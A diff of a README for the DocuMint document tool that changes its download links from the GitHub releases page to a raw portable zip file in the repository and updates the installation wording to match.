@@ -10,7 +10,7 @@
 [![Build Status](https://img.shields.io/badge/Build-Passing-2EA44F.svg?style=flat-square)]()
 [![PRs Welcome](https://img.shields.io/badge/PRs-Welcome-brightgreen.svg?style=flat-square)](http://makeapullrequest.com)
 
-[**Download Latest Release**](https://github.com/Z-root-X/DocuMint/releases) • [**Read The Docs**](docs/USER_GUIDE.md)
+[**Download Latest Version**](https://github.com/Z-root-X/DocuMint/raw/master/DocuMint_Portable.zip) • [**Read The Docs**](docs/USER_GUIDE.md)
 
 </div>
 
@@ -70,7 +70,7 @@ Stop doing manual mail merge. DocuMint brings **Engineering Standards** to docum
 ### 1. Installation
 
 **Stand-alone (Recommended)**  
-[Download `DocuMint.exe`](https://github.com/Z-root-X/DocuMint/releases) and run it. No install required.
+[Download `DocuMint_Portable.zip`](https://github.com/Z-root-X/DocuMint/raw/master/DocuMint_Portable.zip), unzip it, and run `DocuMint.exe`. No install required.
 
 **Developer Setup**
 ```bash
